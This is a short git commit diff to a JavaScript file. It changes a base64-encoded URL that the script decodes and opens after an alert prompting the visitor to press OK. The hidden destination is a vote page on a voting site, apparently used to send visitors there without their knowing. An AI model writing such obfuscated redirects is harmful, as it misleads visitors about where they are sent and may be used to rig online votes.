dfd355e983dbb35ccd062aabf3fb243e228404bd
oldjiltzy <makssokolzm@gmail.com>
2019-03-25 18:23:12 +0200

    rd511

--- 2.js
+++ 2.js
@@ -1,4 +1,4 @@
-var a = 'aHR0cHM6Ly90LWJhdHRsZS5ydS92b3Rlcy8yODQyMjY2'
+var a = 'aHR0cHM6Ly90LWJhdHRsZS5ydS92b3Rlcy85OTIyMDQ1'
 var q = function(){
 	alert('Для перехода нажмите ОК')
   location = atob(a);
